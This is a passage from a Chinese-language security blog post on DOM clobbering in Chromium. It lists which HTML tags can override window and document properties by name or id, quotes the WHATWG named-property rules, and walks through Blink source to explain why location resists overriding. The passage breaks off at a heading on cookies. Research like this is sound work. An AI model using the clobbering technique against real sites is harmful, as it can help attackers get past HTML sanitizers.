class="hljs-string">&quot;figure&quot;</span>, <span class="hljs-string">&quot;font&quot;</span>, <span class="hljs-string">&quot;footer&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;h1&quot;</span>, <span class="hljs-string">&quot;header&quot;</span>, <span class="hljs-string">&quot;hgroup&quot;</span>, <span class="hljs-string">&quot;hr&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;iframe&quot;</span>, <span class="hljs-string">&quot;iframes&quot;</span>, <span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;input&quot;</span>, <span class="hljs-string">&quot;ins&quot;</span>, <span class="hljs-string">&quot;isindex&quot;</span>, <span class="hljs-string">&quot;kbd&quot;</span>, <span class="hljs-string">&quot;keygen&quot;</span>, <span class="hljs-string">&quot;label&quot;</span>, <span class="hljs-string">&quot;legend&quot;</span>, <span class="hljs-string">&quot;li&quot;</span>, <span class="hljs-string">&quot;link&quot;</span>, <span class="hljs-string">&quot;listing&quot;</span>, <span class="hljs-string">&quot;main&quot;</span>, <span class="hljs-string">&quot;map&quot;</span>, <span class="hljs-string">&quot;mark&quot;</span>, <span class="hljs-string">&quot;marquee&quot;</span>, <span class="hljs-string">&quot;menu&quot;</span>, <span class="hljs-string">&quot;menuitem&quot;</span>, <span class="hljs-string">&quot;meta&quot;</span>, <span class="hljs-string">&quot;meter&quot;</span>, <span class="hljs-string">&quot;multicol&quot;</span>, <span class="hljs-string">&quot;nav&quot;</span>, <span class="hljs-string">&quot;nextid&quot;</span>, <span class="hljs-string">&quot;nobr&quot;</span>, <span class="hljs-string">&quot;noembed&quot;</span>, <span class="hljs-string">&quot;noframes&quot;</span>, <span class="hljs-string">&quot;noscript&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>, <span class="hljs-string">&quot;ol&quot;</span>, <span class="hljs-string">&quot;optgroup&quot;</span>, <span class="hljs-string">&quot;option&quot;</span>, <span class="hljs-string">&quot;output&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;picture&quot;</span>, <span class="hljs-string">&quot;plaintext&quot;</span>, <span class="hljs-string">&quot;pre&quot;</span>, <span class="hljs-string">&quot;progress&quot;</span>, <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>, <span class="hljs-string">&quot;rp&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>, <span class="hljs-string">&quot;rtc&quot;</span>, <span class="hljs-string">&quot;ruby&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;samp&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>,&#xA0;&#x2026;]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Window-amp-Name"><a href="#Window-amp-Name" class="headerlink" title="Window &amp; Name"></a>Window &amp; Name</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">window</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&quot;x&quot;</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">window</span>.x != <span class="hljs-literal">undefined</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x4E0E; document &#x4E00;&#x81F4;&#xFF0C;&#x53EA;&#x6709;&#x4E94;&#x4E2A;&#x6807;&#x7B7E;&#x53EF;&#x4EE5;&#x8BA9;<code>window</code>&#x901A;&#x8FC7; name &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#xA0;[<span class="hljs-string">&quot;embed&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x2018;Not-Clobbered&#x2019;"><a href="#&#x2018;Not-Clobbered&#x2019;" class="headerlink" title="&#x2018;Not Clobbered&#x2019;"></a>&#x2018;Not Clobbered&#x2019;</h3><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">&quot;body&quot;</span>, <span class="hljs-string">&quot;caption&quot;</span>, <span class="hljs-string">&quot;col&quot;</span>, <span class="hljs-string">&quot;colgroup&quot;</span>, <span class="hljs-string">&quot;frame&quot;</span>, <span class="hljs-string">&quot;frameset&quot;</span>, <span class="hljs-string">&quot;head&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;tbody&quot;</span>, <span class="hljs-string">&quot;td&quot;</span>, <span class="hljs-string">&quot;tfoot&quot;</span>, <span class="hljs-string">&quot;th&quot;</span>, <span class="hljs-string">&quot;thead&quot;</span>, <span class="hljs-string">&quot;tr&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><p>PS: &#x8FD9;&#x90E8;&#x5206;&#x5E76;&#x4E0D;&#x662F;&#x771F;&#x6B63;&#x4E0D;&#x80FD; Clobbered &#xFF0C;&#x56E0;&#x4E3A;&#x6BD4;&#x5982;&#x8BF4;<code>body</code>&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x672C;&#x8EAB;&#x754C;&#x9762;&#x5B58;&#x5728;&#x4E00;&#x4E2A;<code>body</code>&#x6807;&#x7B7E;&#xFF0C;&#x53EA;&#x662F;&#x5728;&#x6211;&#x6D4B;&#x8BD5;&#x6784;&#x5EFA;&#x7684;&#x7B80;&#x5355;&#x7684; HTML &#x9875;&#x9762;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E9B;&#x6807;&#x7B7E;&#x4E0D;&#x80FD;&#x88AB; Clobbered &#xFF0C;&#x800C;&#x4E14;&#x5728;&#x5B9E;&#x9645;&#x4E2D;&#x4E5F;&#x7528;&#x5230;&#x6BD4;&#x8F83;&#x5C11;&#x3002;&#x5E76;&#x4E14;&#x6839;&#x636E; Chromium &#x4E2D;&#x7684;&#x8BF4;&#x6CD5;&#x662F;&#x201D;but anything by id&#x201D;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x9700;&#x8981;&#x901A;&#x8FC7;<code>Window.id</code>&#x7684;&#x5F62;&#x5F0F;&#x53BB;&#x83B7;&#x53D6;&#x6807;&#x7B7E;&#x7684;&#x8BDD;&#xFF0C;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x6807;&#x7B7E;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF0C;&#x6216;&#x8005;&#x4E5F;&#x53EF;&#x4EE5;&#x5C3D;&#x529B;&#x53BB;&#x6784;&#x5EFA;&#x4E0B;&#x6587;&#x7684;&#x8981;&#x6C42;&#x3002;</p><h3 id="Dom-Doc"><a href="#Dom-Doc" class="headerlink" title="Dom Doc"></a>Dom Doc</h3><p>&#x5176;&#x5B9E;&#x5728; Dom &#x6807;&#x51C6;&#x4E2D;&#x4E5F;&#x6709;&#x63D0;&#x53CA;&#x8FC7;&#x8FD9;&#x90E8;&#x5206;&#xFF0C;&#x5728;<a href="https://html.spec.whatwg.org/multipage/dom.html#dom-document-currentscript" target="_blank" rel="noopener">A part of Document interface</a> &#x8FD9;&#x4E00;&#x6BB5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x76F8;&#x5173;&#x89C4;&#x5B9A;&#xFF1A;</p><blockquote><p>&#x200B;    The <code>Document</code> interface <a href="https://heycam.github.io/webidl/#dfn-support-named-properties" target="_blank" rel="noopener">supports named properties</a>. The <a href="https://heycam.github.io/webidl/#dfn-supported-property-names" target="_blank" rel="noopener">supported property names</a> of a <code>Document</code> object document at any moment consist of the following, in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a> according to the element that contributed them, ignoring later duplicates, and with values from <code>id</code> attributes coming before values from <code>name</code> attributes when the same element contributes both:</p><ul><li>the value of the <code>name</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>embed</code>, <code>form</code>, <code>iframe</code>, <code>img</code>, and <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>object</code> elements that have a non-empty <code>name</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>;</li><li>the value of the <code>id</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>object</code> elements that have a non-empty <code>id</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>; and</li><li>the value of the <code>id</code> content attribute for all <code>img</code> elements that have both a non-empty <code>id</code> content attribute and a non-empty <code>name</code> content attribute, and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>.</li></ul></blockquote><p>&#x4E5F;&#x6709;&#x5173;&#x4E8E;<a href="https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object" target="_blank" rel="noopener"> Window &#x5BF9;&#x8C61;&#x7684;&#x90E8;&#x5206;</a>&#xFF1A;</p><blockquote><p>&#x200B;    The <code>Window</code> object <a href="https://heycam.github.io/webidl/#dfn-support-named-properties" target="_blank" rel="noopener">supports named properties</a>. The <a href="https://heycam.github.io/webidl/#dfn-supported-property-names" target="_blank" rel="noopener">supported property names</a> of a <code>Window</code> object window at any moment consist of the following, in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a> according to the element that contributed them, ignoring later duplicates:</p><ul><li>window&#x2019;s <a href="https://html.spec.whatwg.org/multipage/window-object.html#document-tree-child-browsing-context-name-property-set" target="_blank" rel="noopener">document-tree child browsing context name property set</a>;</li><li>the value of the <code>name</code> content attribute for all <code>embed</code>, <code>form</code>, <code>img</code>, and <code>object</code> elements that have a non-empty <code>name</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with window&#x2019;s <a href="https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window" target="_blank" rel="noopener">associated <code>Document</code></a> as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>; and</li><li>the value of the <code>id</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/infrastructure.html#html-elements" target="_blank" rel="noopener">HTML elements</a> that have a non-empty <code>id</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with window&#x2019;s <a href="https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window" target="_blank" rel="noopener">associated <code>Document</code></a> as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>.</li></ul></blockquote><h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><p>&#x5173;&#x4E8E; window &#x5BF9;&#x8C61;&#xFF0C;&#x867D;&#x7136; window &#x5BF9;&#x8C61;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; id &#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x6807;&#x7B7E;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x76EE;&#x524D;&#x8FD8;&#x6CA1;&#x53D1;&#x73B0;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x6807;&#x7B7E; id &#x8FDB;&#x884C; clobber &#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x6BD5;&#x7ADF;&#x662F;&#x57FA;&#x4E8E; Dom &#x7684;&#x653B;&#x51FB;&#x6280;&#x672F;&#x3002;</p><h3 id="Document"><a href="#Document" class="headerlink" title="Document"></a>Document</h3><p>&#x81F3;&#x4E8E; Document &#x5BF9;&#x8C61;&#xFF0C;&#x6211;&#x5217;&#x4E3E;&#x4E86;&#x4E00;&#x4E0B; Document &#x5BF9;&#x8C61;&#x7279;&#x6709;&#x7684;&#x5C5E;&#x6027;&#x4EE5;&#x53CA;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x7C7B;&#x578B;&#xFF1A;</p><table><thead><tr><th>Class</th><th>Attr</th></tr></thead><tbody><tr><td>DOMImplementation</td><td>[&#x201C;implementation&#x201D;]</td></tr><tr><td>HTMLCollection</td><td>[&#x201C;images&#x201D;, &#x201C;embeds&#x201D;, &#x201C;plugins&#x201D;, &#x201C;links&#x201D;, &#x201C;forms&#x201D;, &#x201C;scripts&#x201D;, &#x201C;anchors&#x201D;, &#x201C;applets&#x201D;, &#x201C;children&#x201D;]</td></tr><tr><td>String</td><td>[&#x201C;documentURI&#x201D;, &#x201C;compatMode&#x201D;, &#x201C;characterSet&#x201D;, &#x201C;charset&#x201D;, &#x201C;inputEncoding&#x201D;, &#x201C;contentType&#x201D;, &#x201C;domain&#x201D;, &#x201C;referrer&#x201D;, &#x201C;cookie&#x201D;, &#x201C;lastModified&#x201D;, &#x201C;readyState&#x201D;, &#x201C;title&#x201D;, &#x201C;dir&#x201D;, &#x201C;designMode&#x201D;, &#x201C;fgColor&#x201D;, &#x201C;linkColor&#x201D;, &#x201C;vlinkColor&#x201D;, &#x201C;alinkColor&#x201D;, &#x201C;bgColor&#x201D;, &#x201C;visibilityState&#x201D;, &#x201C;webkitVisibilityState&#x201D;, &#x201C;nodeName&#x201D;, &#x201C;baseURI&#x201D;]</td></tr><tr><td>HTMLBodyElement</td><td>[&#x201C;body&#x201D;, &#x201C;activeElement&#x201D;]</td></tr><tr><td>HTMLHeadElement</td><td>[&#x201C;head&#x201D;]</td></tr><tr><td>HTMLScriptElement</td><td>[&#x201C;currentScript&#x201D;]</td></tr><tr><td>HTMLAllCollection</td><td>[&#x201C;all&#x201D;]</td></tr><tr><td>NodeList</td><td>[&#x201C;childNodes&#x201D;]</td></tr><tr><td>Window</td><td>[&#x201C;defaultView&#x201D;]</td></tr><tr><td>DocumentType</td><td>[&#x201C;doctype&#x201D;, &#x201C;firstChild&#x201D;]</td></tr><tr><td>Boolean</td><td>[&#x201C;xmlStandalone&#x201D;, &#x201C;hidden&#x201D;, &#x201C;wasDiscarded&#x201D;, &#x201C;webkitHidden&#x201D;, &#x201C;fullscreenEnabled&#x201D;, &#x201C;fullscreen&#x201D;, &#x201C;webkitIsFullScreen&#x201D;, &#x201C;webkitFullscreenEnabled&#x201D;, &#x201C;pictureInPictureEnabled&#x201D;, &#x201C;isConnected&#x201D;]</td></tr><tr><td>FontFaceSet</td><td>[&#x201C;fonts&#x201D;]</td></tr><tr><td>StyleSheetList</td><td>[&#x201C;styleSheets&#x201D;]</td></tr><tr><td>Function</td><td>[&#x201C;getElementsByTagName&#x201D;, &#x201C;getElementsByTagNameNS&#x201D;, &#x201C;getElementsByClassName&#x201D;, &#x201C;createDocumentFragment&#x201D;, &#x201C;createTextNode&#x201D;, &#x201C;createCDATASection&#x201D;, &#x201C;createComment&#x201D;, &#x201C;createProcessingInstruction&#x201D;, &#x201C;importNode&#x201D;, &#x201C;adoptNode&#x201D;, &#x201C;createAttribute&#x201D;, &#x201C;createAttributeNS&#x201D;, &#x201C;createEvent&#x201D;, &#x201C;createRange&#x201D;, &#x201C;createNodeIterator&#x201D;, &#x201C;createTreeWalker&#x201D;, &#x201C;getElementsByName&#x201D;, &#x201C;write&#x201D;, &#x201C;writeln&#x201D;, &#x201C;hasFocus&#x201D;, &#x201C;execCommand&#x201D;, &#x201C;queryCommandEnabled&#x201D;, &#x201C;queryCommandIndeterm&#x201D;, &#x201C;queryCommandState&#x201D;, &#x201C;queryCommandSupported&#x201D;, &#x201C;queryCommandValue&#x201D;, &#x201C;clear&#x201D;, &#x201C;exitPointerLock&#x201D;, &#x201C;createElement&#x201D;, &#x201C;createElementNS&#x201D;, &#x201C;caretRangeFromPoint&#x201D;, &#x201C;elementFromPoint&#x201D;, &#x201C;elementsFromPoint&#x201D;, &#x201C;getElementById&#x201D;, &#x201C;prepend&#x201D;, &#x201C;append&#x201D;, &#x201C;querySelector&#x201D;, &#x201C;querySelectorAll&#x201D;, &#x201C;exitFullscreen&#x201D;, &#x201C;webkitCancelFullScreen&#x201D;, &#x201C;webkitExitFullscreen&#x201D;, &#x201C;createExpression&#x201D;, &#x201C;createNSResolver&#x201D;, &#x201C;evaluate&#x201D;, &#x201C;registerElement&#x201D;, &#x201C;exitPictureInPicture&#x201D;, &#x201C;hasChildNodes&#x201D;, &#x201C;getRootNode&#x201D;, &#x201C;normalize&#x201D;, &#x201C;cloneNode&#x201D;, &#x201C;isEqualNode&#x201D;, &#x201C;isSameNode&#x201D;, &#x201C;compareDocumentPosition&#x201D;, &#x201C;contains&#x201D;, &#x201C;lookupPrefix&#x201D;, &#x201C;lookupNamespaceURI&#x201D;, &#x201C;isDefaultNamespace&#x201D;, &#x201C;insertBefore&#x201D;, &#x201C;appendChild&#x201D;, &#x201C;replaceChild&#x201D;, &#x201C;removeChild&#x201D;]</td></tr><tr><td>NodeList</td><td>[&#x201C;childNodes&#x201D;]</td></tr><tr><td>Array</td><td>[&#x201C;adoptedStyleSheets&#x201D;]</td></tr><tr><td>FeaturePolicy</td><td>[&#x201C;featurePolicy&#x201D;]</td></tr><tr><td>Null</td><td>[&#x201C;xmlEncoding&#x201D;, &#x201C;xmlVersion&#x201D;, &#x201C;onreadystatechange&#x201D;, &#x201C;onpointerlockchange&#x201D;, &#x201C;onpointerlockerror&#x201D;, &#x201C;onbeforecopy&#x201D;, &#x201C;onbeforecut&#x201D;, &#x201C;onbeforepaste&#x201D;, &#x201C;onfreeze&#x201D;, &#x201C;onresume&#x201D;, &#x201C;onsecuritypolicyviolation&#x201D;, &#x201C;onvisibilitychange&#x201D;, &#x201C;oncopy&#x201D;, &#x201C;oncut&#x201D;, &#x201C;onpaste&#x201D;, &#x201C;pointerLockElement&#x201D;, &#x201C;fullscreenElement&#x201D;, &#x201C;onfullscreenchange&#x201D;, &#x201C;onfullscreenerror&#x201D;, &#x201C;webkitCurrentFullScreenElement&#x201D;, &#x201C;webkitFullscreenElement&#x201D;, &#x201C;onwebkitfullscreenchange&#x201D;, &#x201C;onwebkitfullscreenerror&#x201D;, &#x201C;rootElement&#x201D;, &#x201C;pictureInPictureElement&#x201D;, &#x201C;ownerDocument&#x201D;, &#x201C;parentNode&#x201D;, &#x201C;parentElement&#x201D;, &#x201C;previousSibling&#x201D;, &#x201C;nextSibling&#x201D;, &#x201C;nodeValue&#x201D;, &#x201C;textContent&#x201D;]</td></tr></tbody></table><p>&#x5176;&#x4E2D;&#xFF0C;<code>HTMLBodyElement</code>/<code>HTMLHeadElement</code>/<code>HTMLScriptElement</code> &#x5747;&#x7EE7;&#x627F;&#x81EA;<code>HTMLElement</code>&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981;&#x8FD9;&#x4E9B;&#x5462;&#xFF1F;&#x56E0;&#x4E3A;&#x5728;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x6211;&#x4EEC; Clobber &#x5F97;&#x5230;&#x7684;&#x5C31;&#x662F;&#x4E00;&#x4E2A;<code>HTMLElement</code>&#xFF0C;&#x800C; Document &#x67D0;&#x4E9B;&#x5C5E;&#x6027;&#x5F97;&#x5230;&#x7684;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;<code>HTMLElement</code>&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x3002;</p><h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>&#x6211;&#x60F3;&#x5982;&#x679C;&#x80FD;&#x8986;&#x76D6;&#x7684;&#x8BDD;&#xFF0C;&#x5E94;&#x8BE5;&#x5C31;&#x662F;&#x5728;&#x8C03;&#x7528;<code>document.x</code>&#x7684;&#x65F6;&#x5019;&#xFF0C; Dom &#x6811;&#x89E3;&#x6790;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x8981;&#x4F18;&#x5148;&#x4E8E;<code>document</code>&#x81EA;&#x5DF1;&#x672C;&#x8EAB;&#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x4EA7;&#x751F;&#x4E86;&#x8FD9;&#x6837;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x4E5F;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5C31;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x4EEC;&#x5728;&#x8986;&#x76D6;<code>cookie</code>&#x7684;&#x65F6;&#x5019;&#x5374;&#x4E0D;&#x80FD;&#x5B8C;&#x5168;&#x63A7;&#x5236;&#x8986;&#x76D6;&#x5462;&#xFF1F;</p><p>&#x5E26;&#x7740;&#x8FD9;&#x4E9B;&#x7591;&#x95EE;&#xFF0C;&#x6211;&#x7279;&#x5730;&#x53BB;&#x770B;&#x4E86;&#x4E00;&#x4F1A; chromium &#x7684;&#x6E90;&#x7801;&#xFF0C;&#x7B80;&#x7565;&#x5730;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x8FD9;&#x4E9B;&#x5B9E;&#x73B0;&#xFF0C;&#x4E3B;&#x8981;&#x5728; chromium &#x7684; blink &#x90E8;&#x5206;&#x3002;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x77E5;&#x8BC6;&#x6D45;&#x8584;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x5B8C;&#x6574;&#x5730;&#x9605;&#x8BFB;&#x8FC7; chromium &#x6E90;&#x7801;&#xFF0C;&#x8FD9;&#x91CC;&#x8FD8;&#x53EF;&#x80FD;&#x8BBE;&#x8BA1;&#x5230;&#x4E00;&#x4E9B;&#x7F16;&#x8BD1;&#x539F;&#x7406;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x5E76;&#x6CA1;&#x6709;&#x5B89;&#x5168;&#x628A;&#x6574;&#x4E2A; Chromium &#x4EA7;&#x751F;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x7F18;&#x7531;&#x4EE5;&#x4EE3;&#x7801;&#x8FFD;&#x8E2A;&#x7684;&#x5F62;&#x5F0F;&#x5F04;&#x51FA;&#x6765;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x5F04;&#x7684;&#x8BDD;&#x4F30;&#x8BA1;&#x4E5F;&#x5F97;&#x53BB; debug Chromium &#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x53E6;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x7684;&#x5185;&#x5BB9;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x4E2A;&#x90E8;&#x5206;&#x8FD8;&#x6709;&#x5F85;&#x7EE7;&#x7EED;&#x7814;&#x7A76;&#xFF0C;&#x4E0D;&#x8FC7;&#x6211;&#x628A;&#x81EA;&#x5DF1;&#x770B;&#x7684;&#x4E00;&#x4E9B;&#x6709;&#x7528;&#x7684;&#x90E8;&#x5206;&#x5199;&#x51FA;&#x6765;&#x3002;&#x5982;&#x679C;&#x6709;&#x5174;&#x8DA3;&#x7684;&#x670B;&#x53CB;&#x53EF;&#x4EE5;&#x8054;&#x7CFB;&#x6211;&#x4E00;&#x8D77;&#x7814;&#x7A76;&#x770B;&#x770B;&#x3002;&#xFF08;&#x867D;&#x7136;&#x6211;&#x5F88;&#x83DC;XD</p><p>&#x5168;&#x90E8;&#x4EE3;&#x7801;&#x6765;&#x6E90;&#x4E8E; <a href="https://source.chromium.org/" target="_blank" rel="noopener">Chomiunm Code Search</a>&#xFF0C;&#x8FD9;&#x4E2A;&#x5E73;&#x53F0;&#x53EF;&#x4EE5;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#x5BA1;&#x4EE3;&#x7801;&#x3002;</p><h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;<code>location</code>&#xFF0C;&#x6211;&#x4EEC;&#x65E2;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>window.location</code>&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>document.location</code>&#x62FF;&#x5230;<code>location</code>&#xFF0C;&#x8FD9;&#x4E5F;&#x80FD;&#x8BF4;&#x660E;&#x6211;&#x4EEC;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0A;&#x6587;&#x8981;&#x5355;&#x72EC; fuzz Document &#x7279;&#x6709;&#x7684;&#x5C5E;&#x6027;&#x800C;&#x4E0D;&#x662F;&#x5168;&#x90E8;&#x5C5E;&#x6027;&#x4E86;&#x3002;</p><p>&#x5728; Chromium &#x6E90;&#x7801;&#x4E2D;&#xFF0C;&#x627E;&#x5230;<code>location</code>&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C; Chromium &#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4E86;<code>window</code>&#x5BF9;&#x8C61;&#x7684;<code>location()</code>&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x8986;&#x76D6;&#x4E0D;&#x4E86;&#x3002;</p><p>&#x5728;<code>third_party/blink/renderer/core/dom/document.cc</code>&#x4E2D;&#xFF0C;&#x7B2C; 933 &#x884C;&#x4E2D;&#x6709;&#x76F8;&#x5173;&#x5B9A;&#x4E49; <a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/dom/document.cc;l=933?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">Document::location()</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">Location* <span class="hljs-title">Document::location</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (!GetFrame())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> domWindow()-&gt;location();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4E86;<code>domWindow()</code>&#x6765;&#x83B7;&#x53D6;<code>location</code>&#xFF0C;&#x5728;<code>third_party/blink/renderer/core/frame/dom_window.cc</code>&#x4E2D;&#xFF0C;&#x7B2C;85&#x884C;&#x6709;&#x76F8;&#x5173;&#x5B9A;&#x4E49; <a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/frame/dom_window.cc;drc=7e3843b722bda29c236e9cb49111f3296dc2ce20;l=85" target="_blank" rel="noopener">DOMWindow::location()</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">Location* <span class="hljs-title">DOMWindow::location</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (!location_)</span><br><span class="line">    location_ = MakeGarbageCollected&lt;Location&gt;(<span class="hljs-keyword">const_cast</span>&lt;DOMWindow*&gt;(<span class="hljs-keyword">this</span>));</span><br><span class="line">  <span class="hljs-keyword">return</span> location_.Get();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53E6;&#x5916;&#xFF0C;&#x6709;&#x4EBA;&#x63D0;&#x8FC7;&#x76F8;&#x5173;&#x7528;&#x5176;&#x4ED6; hook &#x7684;&#x65B9;&#x5F0F; <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=315760" target="_blank" rel="noopener">Issue 315760: document.domain can be hooked</a>&#xFF0C;&#x91CC;&#x9762;&#x63D0;&#x5230;&#x53EF;&#x4EE5; hook &#x5230; domain &#x8DDF; location &#xFF0C;&#x4F46;&#x662F;&#x6211;&#x5728;&#x76EE;&#x524D; stable chrome &#x4E0A;&#x6D4B;&#x8BD5;&#x53EA;&#x80FD; hook &#x5230; domain &#xFF0C;&#x81F3;&#x4E8E; location &#x4E0D;&#x77E5;&#x9053;&#x662F;&#x4E0D;&#x662F;&#x88AB;&#x4FEE;&#x4E86;&#xFF0C;&#x5C3D;&#x7BA1;&#x56DE;&#x590D;&#x7684;&#x662F;&#x201D;Browsers allow hooking these properties. It doesn&#x2019;t matter&#x201D;</p><h3 id="Cookie"><a href="#Cookie" class="headerlink" 